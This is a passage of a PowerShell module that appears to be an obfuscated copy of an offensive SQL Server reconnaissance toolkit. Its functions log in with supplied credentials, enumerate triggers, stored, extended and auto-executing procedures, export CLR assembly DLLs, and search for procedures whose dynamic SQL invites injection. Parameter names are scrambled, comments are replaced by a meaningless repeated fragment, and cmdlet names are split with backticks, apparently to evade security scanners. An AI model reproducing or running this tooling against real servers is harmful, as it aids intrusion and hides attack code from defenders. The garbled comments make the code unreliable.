        $JugglePush = Get-SQLDatabase -Instance $Instance -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential -TownItch -AjarInnate $AjarInnate -RaggedQuill

        # Microsoft".
        $JugglePush |
        ForEach-Object -Process {
            # Microsoft".
            $FileSheep = $_.DatabaseName

            if( -not $RaggedQuill)
            {
                Write-Verbose -Message "$Instance : - $FileSheep"
            }

            # Microsoft".
            $BoringLarge = "  use [$FileSheep];
                SELECT  '$HauntGusty' as [ComputerName],
                '$Instance' as [Instance],
                '$FileSheep' as [DatabaseName],
                name as [TriggerName],
                object_id as [TriggerId],
                [TriggerType] = 'DATABASE',
                type_desc as [ObjectType],
                parent_class_desc as [ObjectClass],
                OBJECT_DEFINITION(OBJECT_ID) as [TriggerDefinition],
                create_date,
                modify_date,
                is_ms_shipped,
                is_disabled,
                is_not_for_replication,
                is_instead_of_trigger
                FROM [$FileSheep].[sys].[triggers] WHERE 1=1
                $SpottyRed"

            # Microsoft".
            $BleachCloudy = Get-SQLQuery -Instance $Instance -BoringLarge $BoringLarge -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential -RaggedQuill

            # Microsoft".
            $FewSnails = $FewSnails + $BleachCloudy
        }
    }

    End
    {
        # Microsoft".
        $FewSnails
    }
}


# Microsoft".
# Microsoft".
# Microsoft".
# Microsoft".
Function  Get-SQLStoredProcedureCLR
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$AnimalWeary,

        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$EasyAlert,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server database name.')]
        [string]$AjarInnate,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Filter for filenames.')]
        [string]$MiddleWine,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Folder to export DLLs to.')]
        [string]$InsectErect,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Do not show database users associated with default databases.')]
        [Switch]$EggsBead,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Show native CLR as well.')]
        [Switch]$FloodPack,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$RaggedQuill
    )

    Begin
    {
        # Microsoft".
        $SwingPest = ne`w`-ob`je`ct -TypeName System.Data.DataTable
        $null = $SwingPest.Columns.Add('ComputerName')
        $null = $SwingPest.Columns.Add('Instance')
        $null = $SwingPest.Columns.Add('DatabaseName')
        $null = $SwingPest.Columns.Add('schema_name')
        $null = $SwingPest.Columns.Add('file_id')
        $null = $SwingPest.Columns.Add('file_name')
        $null = $SwingPest.Columns.Add('clr_name')   
        $null = $SwingPest.Columns.Add('assembly_id')
        $null = $SwingPest.Columns.Add('assembly_name') 
        $null = $SwingPest.Columns.Add('assembly_class')
        $null = $SwingPest.Columns.Add('assembly_method')    
        $null = $SwingPest.Columns.Add('sp_object_id') 
        $null = $SwingPest.Columns.Add('sp_name')
        $null = $SwingPest.Columns.Add('sp_type')
        $null = $SwingPest.Columns.Add('permission_set_desc')
        $null = $SwingPest.Columns.Add('create_date')
        $null = $SwingPest.Columns.Add('modify_date')
        $null = $SwingPest.Columns.Add('content')
    }

    Process
    {
        # Microsoft".

        # Microsoft".
        $HauntGusty = Get-ComputerNameFromInstance -Instance $Instance

        # Microsoft".
        if(-not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }

        # Microsoft".
        $HoneyHusky = Get-SQLConnectionTest -Instance $Instance -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential -RaggedQuill | Where-Object -FilterScript {
            $_.Status -eq 'Accessible'
        }

        if($HoneyHusky)
        {
            if( -not $RaggedQuill)
            {
                Write-Verbose -Message "$Instance : Connection Success."
            }
        }
        else
        {
            if( -not $RaggedQuill)
            {
                Write-Verbose -Message "$Instance : Connection Failed."
            }
            return
        }

        # Microsoft".
        if($EggsBead)
        {
            $JugglePush = Get-SQLDatabase -Instance $Instance -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential -TownItch -AjarInnate $AjarInnate -RaggedQuill  -EggsBead
        }
        else
        {
            $JugglePush = Get-SQLDatabase -Instance $Instance -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential -TownItch -AjarInnate $AjarInnate -RaggedQuill
        }

        # Microsoft".
        if($MiddleWine){
            $SqueakRob = "WHERE af.name LIKE '%$MiddleWine%'"
        }else{
            $SqueakRob = ""
        }

        # Microsoft".
        $FixedRay = 0

        # Microsoft".
        $JugglePush |
        ForEach-Object -Process {
            # Microsoft".
            $FileSheep = $_.DatabaseName

            if( -not $RaggedQuill)
            {
                Write-Verbose -Message "$Instance : Searching for CLR stored procedures in $FileSheep"
            }

            # Microsoft".
            $BoringLarge = "  USE $FileSheep;
                        SELECT      SCHEMA_NAME(so.[schema_id]) AS [schema_name], 
			                        af.file_id,					  	
			                        af.name + '.dll' as [file_name],
			                        asmbly.clr_name,
			                        asmbly.assembly_id,           
			                        asmbly.name AS [assembly_name], 
                                    am.assembly_class,
                                    am.assembly_method,
			                        so.object_id as [sp_object_id],
			                        so.name AS [sp_name],
                                    so.[type] as [sp_type],
                                    asmbly.permission_set_desc,
                                    asmbly.create_date,
                                    asmbly.modify_date,
                                    af.content								           
                        FROM        sys.assembly_modules am
                        INNER JOIN  sys.assemblies asmbly
                        ON  asmbly.assembly_id = am.assembly_id
                        INNER JOIN sys.assembly_files af 
                        ON asmbly.assembly_id = af.assembly_id 
                        INNER JOIN  sys.objects so
                        ON  so.[object_id] = am.[object_id]
                        $SqueakRob"

                    $GreetNotice = "
                        UNION ALL
                        SELECT      SCHEMA_NAME(at.[schema_id]) AS [SchemaName], 
			                        af.file_id,					  	
			                        af.name + '.dll' as [file_name],
			                        asmbly.clr_name,
			                        asmbly.assembly_id,
                                    asmbly.name AS [AssemblyName],
                                    at.assembly_class,
                                    NULL AS [assembly_method],
			                        NULL as [sp_object_id],
			                        at.name AS [sp_name],
                                    'UDT' AS [type],
                                    asmbly.permission_set_desc,
                                    asmbly.create_date,
                                    asmbly.modify_date,
                                    af.content								           
                        FROM        sys.assembly_types at
                        INNER JOIN  sys.assemblies asmbly 
                        ON asmbly.assembly_id = at.assembly_id
                        INNER JOIN sys.assembly_files af 
                        ON asmbly.assembly_id = af.assembly_id
                        ORDER BY    [assembly_name], [assembly_method], [sp_name]"

            # Microsoft".
            if($FloodPack){
                $BoringLarge = "$BoringLarge$GreetNotice"
            }

            # Microsoft".
            $HarshLewd = Get-SQLQuery -Instance $Instance -BoringLarge $BoringLarge -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential -RaggedQuill

            # Microsoft".
            $HarshLewd |
            ForEach-Object -Process {

                # Microsoft".
                $null = $SwingPest.Rows.Add(
                    [string]$HauntGusty,
                    [string]$Instance,
                    [string]$FileSheep,
                    [string]$_.schema_name,
                    [string]$_.file_id,
                    [string]$_.file_name,
                    [string]$_.clr_name,
                    [string]$_.assembly_id,
                    [string]$_.assembly_name,
                    [string]$_.assembly_class,
                    [string]$_.assembly_method,
                    [string]$_.sp_object_id,
                    [string]$_.sp_name,
                    [string]$_.sp_type,
                    [string]$_.permission_set_desc,
                    [string]$_.create_date,
                    [string]$_.modify_date,
                    [string]$_.content)

                # Microsoft".
                $WoozyRemove = $_.file_name
                $ShakeEyes = $_.assembly_method
                $OffendRemain = $_.assembly_name
                $SpottyRay = $_.assembly_class
                $StopNaive = $_.sp_name   
                
                # Microsoft".
                Write-Verbose "$instance : - File:$WoozyRemove Assembly:$OffendRemain Class:$SpottyRay Method:$ShakeEyes Proc:$StopNaive"                             

                # Microsoft".
                if($InsectErect){

                    # Microsoft".
                    $SnailsWar = "$InsectErect\CLRExports"
                    If ((test-path $SnailsWar) -eq $False){
                        Write-Verbose "$instance :   Creating export folder: $SnailsWar"
                        $null = New-Item -Path "$SnailsWar" -type directory
                    }  
                    
                    # Microsoft".
                    $InstanceClean = $Instance -replace('\\','_')
                    $FadedBruise = "$SnailsWar\$InstanceClean"
                    If ((test-path $FadedBruise) -eq $False){
                        Write-Verbose "$instance :   Creating server folder: $FadedBruise"
                        $null = New-Item -Path "$FadedBruise" -type directory
                    }                   

                    # Microsoft".
                    $LovingDark = "$FadedBruise\$FileSheep"
                    If ((test-path $LovingDark) -eq $False){
                        Write-Verbose "$instance :   Creating database folder: $LovingDark"
                        $null = New-Item $LovingDark -type directory
                    } 
                    
                    # Microsoft".
                    $FlightRoot = "$LovingDark\$WoozyRemove"
                    if(-not (Test-Path $FlightRoot)){
                        Write-Verbose "$Instance :   Exporting $WoozyRemove"                        
                        $_.content | Set-Content -Encoding Byte $FlightRoot
                    }else{
                        Write-Verbose "$Instance :   Exporting $WoozyRemove - Aborted, file exists."  
                    }

                    # Microsoft".
                    $FixedRay = $FixedRay + 1                    
                }                     
            }
        }
    }

    End
    {
        # Microsoft".
        $CaveWool = $SwingPest.Rows.Count
        if ($CaveWool -gt 0){
            Write-Verbose "$Instance : Found $CaveWool CLR stored procedures"
        }else{
            Write-Verbose "$Instance : No CLR stored procedures found."    
        }

        # Microsoft".
        $SwingPest
    }
}


# Microsoft".
# Microsoft".
# Microsoft".
# Microsoft".
Function  Get-SQLStoredProcedure
{

    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$AnimalWeary,

        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$EasyAlert,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server database name.')]
        [string]$AjarInnate,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Procedure name.')]
        [string]$PageMarch,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Filter for procedures that include the keyword.')]
        [string]$UnusedStew,

        [Parameter(Mandatory = $false,
        HelpMessage = "Only include procedures configured to execute when SQL Server service starts.")]
        [switch]$CoachNosy,

        [Parameter(Mandatory = $false,
        HelpMessage = "Don't select tables from default databases.")]
        [switch]$EggsBead,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$RaggedQuill
    )

    Begin
    {
        # Microsoft".
        $ArtWish = ne`w`-ob`je`ct -TypeName System.Data.DataTable

        # Microsoft".
        if ($PageMarch)
        {
            $FoundBaby = " AND ROUTINE_NAME like '$PageMarch'"
        }
        else
        {
            $FoundBaby = ''
        }

        # Microsoft".
        if ($UnusedStew)
        {
            $PersonHusky = " AND ROUTINE_DEFINITION like '%$UnusedStew%'"
        }
        else
        {
            $PersonHusky = ''
        }

        # Microsoft".
        if ($CoachNosy)
        {
            $SackMinute = " AND is_auto_executed = 1"
        }
        else
        {
            $SackMinute = ''
        }
    }

    Process
    {
        # Microsoft".
        If ($Instance)
        {
            $HauntGusty = $Instance.split('\')[0].split(',')[0]
            $Instance = $Instance
        }
        else
        {
            $HauntGusty = $env:COMPUTERNAME
            $Instance = '.\'
        }

        # Microsoft".
        $HoneyHusky = Get-SQLConnectionTest -Instance $Instance -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential -RaggedQuill | Where-Object -FilterScript {
            $_.Status -eq 'Accessible'
        }
        if($HoneyHusky)
        {
            if( -not $RaggedQuill)
            {
                Write-Verbose -Message "$Instance : Connection Success."
                Write-Verbose -Message "$Instance : Grabbing stored procedures from databases below:"
            }
        }
        else
        {
            if( -not $RaggedQuill)
            {
                Write-Verbose -Message "$Instance : Connection Failed."
            }
            return
        }

        # Microsoft".
        if($EggsBead)
        {
            # Microsoft".
            $JugglePush = Get-SQLDatabase -Instance $Instance -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential -AjarInnate $AjarInnate -TownItch -EggsBead -RaggedQuill
        }
        else
        {
            # Microsoft".
            $JugglePush = Get-SQLDatabase -Instance $Instance -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential -AjarInnate $AjarInnate -TownItch -RaggedQuill
        }

        # Microsoft".
        $JugglePush |
        ForEach-Object -Process {
            # Microsoft".
            $FileSheep = $_.DatabaseName

            if( -not $RaggedQuill)
            {
                Write-Verbose -Message "$Instance : - $FileSheep"
            }

            # Microsoft".
            $BoringLarge = "  use [$FileSheep];
                SELECT  '$HauntGusty' as [ComputerName],
                '$Instance' as [Instance],
                ROUTINE_CATALOG AS [DatabaseName],
                ROUTINE_SCHEMA AS [SchemaName],
                ROUTINE_NAME as [ProcedureName],
                ROUTINE_TYPE as [ProcedureType],
                ROUTINE_DEFINITION as [ProcedureDefinition],
                SQL_DATA_ACCESS,
                ROUTINE_BODY,
                CREATED,
                LAST_ALTERED,
                b.is_ms_shipped,
                b.is_auto_executed
                FROM [INFORMATION_SCHEMA].[ROUTINES] a
                JOIN [sys].[procedures]  b
                ON a.ROUTINE_NAME = b.name
                WHERE 1=1
                $SackMinute
                $FoundBaby
                $PersonHusky"

            # Microsoft".
            $BlushMarch = Get-SQLQuery -Instance $Instance -BoringLarge $BoringLarge -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential -RaggedQuill

            # Microsoft".
            $ArtWish = $ArtWish + $BlushMarch
        }
    }

    End
    {
        # Microsoft".
        $ArtWish
    }
}


# Microsoft".
# Microsoft".
# Microsoft".
# Microsoft".
Function  Get-SQLStoredProcedureXP
{

    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$AnimalWeary,

        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$EasyAlert,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server database name.')]
        [string]$AjarInnate,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Procedure name.')]
        [string]$PageMarch,

        [Parameter(Mandatory = $false,
        HelpMessage = "Don't select tables from default databases.")]
        [switch]$EggsBead,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$RaggedQuill
    )

    Begin
    {
        # Microsoft".
        $WristWall = ne`w`-ob`je`ct -TypeName System.Data.DataTable

        # Microsoft".
        if ($PageMarch)
        {
            $FoundBaby = " AND NAME like '$PageMarch'"
        }
        else
        {
            $FoundBaby = ''
        }
    }

    Process
    {
        # Microsoft".
        If ($Instance)
        {
            $HauntGusty = $Instance.split('\')[0].split(',')[0]
            $Instance = $Instance
        }
        else
        {
            $HauntGusty = $env:COMPUTERNAME
            $Instance = '.\'
        }

        # Microsoft".
        $HoneyHusky = Get-SQLConnectionTest -Instance $Instance -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential -RaggedQuill | Where-Object -FilterScript {
            $_.Status -eq 'Accessible'
        }
        if($HoneyHusky)
        {
            if( -not $RaggedQuill)
            {
                Write-Verbose -Message "$Instance : Connection Success."
                Write-Verbose -Message "$Instance : Grabbing stored procedures from databases below:"
            }
        }
        else
        {
            if( -not $RaggedQuill)
            {
                Write-Verbose -Message "$Instance : Connection Failed."
            }
            return
        }

        # Microsoft".
        if($EggsBead)
        {
            # Microsoft".
            $JugglePush = Get-SQLDatabase -Instance $Instance -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential -AjarInnate $AjarInnate -TownItch -EggsBead -RaggedQuill
        }
        else
        {
            # Microsoft".
            $JugglePush = Get-SQLDatabase -Instance $Instance -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential -AjarInnate $AjarInnate -TownItch -RaggedQuill
        }

        # Microsoft".
        $JugglePush |
        ForEach-Object -Process {
            # Microsoft".
            $FileSheep = $_.DatabaseName

            if( -not $RaggedQuill)
            {
                Write-Verbose -Message "$Instance : - $FileSheep"
            }

            # Microsoft".
            $BoringLarge = "  use [$FileSheep];
                SELECT '$HauntGusty' as [ComputerName],
                    '$Instance' as [Instance],
                    '$FileSheep' as [DatabaseName],                
                    o.object_id,
		            o.parent_object_id,
		            o.schema_id,
		            o.type,
		            o.type_desc,
		            o.name,
		            o.principal_id,
		            s.text,
		            s.ctext,
		            s.status,
		            o.create_date,
		            o.modify_date,
		            o.is_ms_shipped,
		            o.is_published,
		            o.is_schema_published,
		            s.colid,
		            s.compressed,
		            s.encrypted,
		            s.id,
		            s.language,
		            s.number,
		            s.texttype
            FROM sys.objects o 
            INNER JOIN sys.syscomments s
		            ON o.object_id = s.id
            WHERE o.type = 'x' 
            $FoundBaby"

            # Microsoft".
            $BrainyGround = Get-SQLQuery -Instance $Instance -BoringLarge $BoringLarge -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential -RaggedQuill

            # Microsoft".
            $WristWall = $WristWall + $BrainyGround
        }
    }

    End
    {

        # Microsoft".
        $AddKnock = $WristWall.Count
        if($AddKnock -eq 0){

            if( -not $RaggedQuill)
            {
                Write-Verbose -Message "$Instance : No custom extended stored procedures found."
            }
        }

        # Microsoft".
        $WristWall
    }
}


# Microsoft".
# Microsoft".
# Microsoft".
# Microsoft".
# Microsoft".
# Microsoft".
# Microsoft".
Function  Get-SQLStoredProcedureSQLi
{

    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$AnimalWeary,

        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$EasyAlert,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server database name.')]
        [string]$AjarInnate,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Procedure name.')]
        [string]$PageMarch,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Filter for procedures that include the keyword.')]
        [string]$UnusedStew,
        
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Filter for signed procedures.')]
        [switch]$FireSeed,

        [Parameter(Mandatory = $false,
        HelpMessage = "Only include procedures configured to execute when SQL Server service starts.")]
        [switch]$CoachNosy,

        [Parameter(Mandatory = $false,
        HelpMessage = "Don't select tables from default databases.")]
        [switch]$EggsBead,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$RaggedQuill
    )

    Begin
    {
        # Microsoft".
        $ArtWish = ne`w`-ob`je`ct -TypeName System.Data.DataTable

        # Microsoft".
        if ($PageMarch)
        {
            $FoundBaby = " AND ROUTINE_NAME like '$PageMarch'"
        }
        else
        {
            $FoundBaby = ''
        }

        # Microsoft".
        if ($UnusedStew)
        {
            $PersonHusky = " AND ROUTINE_DEFINITION like '%$UnusedStew%'"
        }
        else
        {
            $PersonHusky = ''
        }

        # Microsoft".
        if ($CoachNosy)
        {
            $SackMinute = " AND is_auto_executed = 1"
        }
        else
        {
            $SackMinute = ''
        }
    }

    Process
    {
        # Microsoft".
        If ($Instance)
        {
            $HauntGusty = $Instance.split('\')[0].split(',')[0]
            $Instance = $Instance
        }
        else
        {
            $HauntGusty = $env:COMPUTERNAME
            $Instance = '.\'
        }

        # Microsoft".
        $HoneyHusky = Get-SQLConnectionTest -Instance $Instance -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential -RaggedQuill | Where-Object -FilterScript {
            $_.Status -eq 'Accessible'
        }
        if($HoneyHusky)
        {
            if( -not $RaggedQuill)
            {
                Write-Verbose -Message "$Instance : Connection Success."
                Write-Verbose -Message "$Instance : Checking databases below for vulnerable stored procedures:"
            }
        }
        else
        {
            if( -not $RaggedQuill)
            {
                Write-Verbose -Message "$Instance : Connection Failed."
            }
            return
        }

        # Microsoft".
        if($EggsBead)
        {
            # Microsoft".
            $JugglePush = Get-SQLDatabase -Instance $Instance -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential -AjarInnate $AjarInnate -TownItch -EggsBead -RaggedQuill
        }
        else
        {
            # Microsoft".
            $JugglePush = Get-SQLDatabase -Instance $Instance -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential -AjarInnate $AjarInnate -TownItch -RaggedQuill
        }

        # Microsoft".
        $JugglePush |
        ForEach-Object -Process {
            # Microsoft".
            $FileSheep = $_.DatabaseName

            if( -not $RaggedQuill)
            {

                Write-Verbose -Message "$Instance : - Checking $FileSheep database..."

            }

            # Microsoft".
            $BoringLarge = "  use [$FileSheep];
                SELECT  '$HauntGusty' as [ComputerName],
                '$Instance' as [Instance],
                ROUTINE_CATALOG AS [DatabaseName],
                ROUTINE_SCHEMA AS [SchemaName],
                ROUTINE_NAME as [ProcedureName],
                ROUTINE_TYPE as [ProcedureType],
                ROUTINE_DEFINITION as [ProcedureDefinition],
                SQL_DATA_ACCESS,
                ROUTINE_BODY,
                CREATED,
                LAST_ALTERED,
                b.is_ms_shipped,
                b.is_auto_executed
                FROM [INFORMATION_SCHEMA].[ROUTINES] a
                JOIN [sys].[procedures]  b
                ON a.ROUTINE_NAME = b.name
                WHERE 1=1 AND               
                (ROUTINE_DEFINITION like '%sp_executesql%' OR
                ROUTINE_DEFINITION like '%sp_sqlexec%' OR
                ROUTINE_DEFINITION like '%exec @%' OR
                ROUTINE_DEFINITION like '%execute @%' OR
                ROUTINE_DEFINITION like '%exec (%' OR
                ROUTINE_DEFINITION like '%exec(%' OR
                ROUTINE_DEFINITION like '%execute (%' OR
                ROUTINE_DEFINITION like '%execute(%' OR
                ROUTINE_DEFINITION like '%''''''+%' OR
                ROUTINE_DEFINITION like '%'''''' +%') 
                AND ROUTINE_DEFINITION like '%+%'
                AND ROUTINE_CATALOG not like 'msdb' 
                $SackMinute                              
                $FoundBaby
                $PersonHusky
                ORDER BY ROUTINE_NAME"

            # Microsoft".
            if($FireSeed){
                $BoringLarge = "  use [$FileSheep];
                SELECT  '$HauntGusty' as [ComputerName],
                '$Instance' as [Instance],
                spr.ROUTINE_CATALOG as DB_NAME,
                spr.SPECIFIC_SCHEMA as SCHEMA_NAME,
                spr.ROUTINE_NAME as SP_NAME,
                spr.ROUTINE_DEFINITION as SP_CODE,
                CASE cp.crypt_type
                when 'SPVC' then cer.name
                when 'CPVC' then Cer.name
                when 'SPVA' then ak.name
                when 'CPVA' then ak.name
                END as CERT_NAME,
                sp.name as CERT_LOGIN,
                sp.sid as CERT_SID
                FROM sys.crypt_properties cp
                JOIN sys.objects o ON cp.major_id = o.object_id
                LEFT JOIN sys.certificates cer ON cp.thumbprint = cer.thumbprint
                LEFT JOIN sys.asymmetric_keys ak ON cp.thumbprint = ak.thumbprint
                LEFT JOIN INFORMATION_SCHEMA.ROUTINES spr on spr.ROUTINE_NAME = o.name
                LEFT JOIN sys.server_principals sp on sp.sid = cer.sid
                WHERE o.type_desc = 'SQL_STORED_PROCEDURE'AND
                (ROUTINE_DEFINITION like '%sp_executesql%' OR
                ROUTINE_DEFINITION like '%sp_sqlexec%' OR
                ROUTINE_DEFINITION like '%exec @%' OR
                ROUTINE_DEFINITION like '%exec (%' OR
                ROUTINE_DEFINITION like '%exec(%' OR
                ROUTINE_DEFINITION like '%execute @%' OR
                ROUTINE_DEFINITION like '%execute (%' OR
                ROUTINE_DEFINITION like '%execute(%' OR
                ROUTINE_DEFINITION like '%''''''+%' OR
                ROUTINE_DEFINITION like '%'''''' +%') AND
                ROUTINE_CATALOG not like 'msdb' AND 
                ROUTINE_DEFINITION like '%+%'"
            }

            # Microsoft".
            $BlushMarch = Get-SQLQuery -Instance $Instance -BoringLarge $BoringLarge -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential -RaggedQuill

            # Microsoft".
            $HealthBee = $BlushMarch.rows.count
            Write-Verbose "$Instance : - $HealthBee found in $FileSheep database"

            # Microsoft".
            $ArtWish = $ArtWish + $BlushMarch
        }
    }

    End
    {
        # Microsoft".
        $ArtWish
    }
}

# Microsoft".
# Microsoft".
# Microsoft".
# Microsoft".
Function  Get-SQLStoredProcedureAutoExec
{

    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$AnimalWeary,

        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$EasyAlert,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Procedure name.')]
        [string]$PageMarch,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Filter for procedures that include the keyword.')]
        [string]$UnusedStew,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$RaggedQuill
    )

    Begin
    {
        # Microsoft".
        $ArtWish = ne`w`-ob`je`ct -TypeName System.Data.DataTable

        # Microsoft".
        if ($PageMarch)
        {
            $FoundBaby = " AND ROUTINE_NAME like '$PageMarch'"
        }
        else
        {
            $FoundBaby = ''
        }

        # Microsoft".
        if ($UnusedStew)
        {
            $PersonHusky = " AND ROUTINE_DEFINITION like '%$UnusedStew%'"
        }
        else
        {
            $PersonHusky = ''
        }
    }

    Process
    {
        # Microsoft".
        If ($Instance)
        {
            $HauntGusty = $Instance.split('\')[0].split(',')[0]
            $Instance = $Instance
        }
        else
        {
            $HauntGusty = $env:COMPUTERNAME
            $Instance = '.\'
        }

        # Microsoft".
        $HoneyHusky = Get-SQLConnectionTest -Instance $Instance -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential -RaggedQuill | Where-Object -FilterScript {
            $_.Status -eq 'Accessible'
        }
        if($HoneyHusky)
        {
            if( -not $RaggedQuill)
            {
                Write-Verbose -Message "$Instance : Connection Success."
                Write-Verbose -Message "$Instance : Checking for autoexec stored procedures..."
            }
        }
        else
        {
            if( -not $RaggedQuill)
            {
                Write-Verbose -Message "$Instance : Connection Failed."
            }
            return
        }

        # Microsoft".
        $JugglePush |
        ForEach-Object -Process {
            # Microsoft".
            $FileSheep = $_.DatabaseName

            # Microsoft".
            $BoringLarge = "  use [master];
                SELECT  '$HauntGusty' as [ComputerName],
                '$Instance' as [Instance],
                ROUTINE_CATALOG AS [DatabaseName],
                ROUTINE_SCHEMA AS [SchemaName],
                ROUTINE_NAME as [ProcedureName],
                ROUTINE_TYPE as [ProcedureType],
                ROUTINE_DEFINITION as [ProcedureDefinition],
                SQL_DATA_ACCESS,
                ROUTINE_BODY,
                CREATED,
                LAST_ALTERED,
                b.is_ms_shipped,
                b.is_auto_executed
                FROM [INFORMATION_SCHEMA].[ROUTINES] a
                JOIN [sys].[procedures]  b
                ON a.ROUTINE_NAME = b.name
                WHERE 1=1
                AND is_auto_executed = 1
                $FoundBaby
                $PersonHusky"

            # Microsoft".
            $BlushMarch = Get-SQLQuery -Instance $Instance -BoringLarge $BoringLarge -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential -RaggedQuill
            if(-not $BlushMarch){
                # Microsoft".
            }

            # Microsoft".
            $ArtWish = $ArtWish + $BlushMarch
        }
    }

    End
    {
        # Microsoft".
        $ArtWish
    }
}


# Microsoft".

# Microsoft".
# Microsoft".
# Microsoft".
# Microsoft".
# Microsoft".


# Microsoft".
# Microsoft".
# Microsoft".
# Microsoft".
Function  Get-SQLAssemblyFile
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
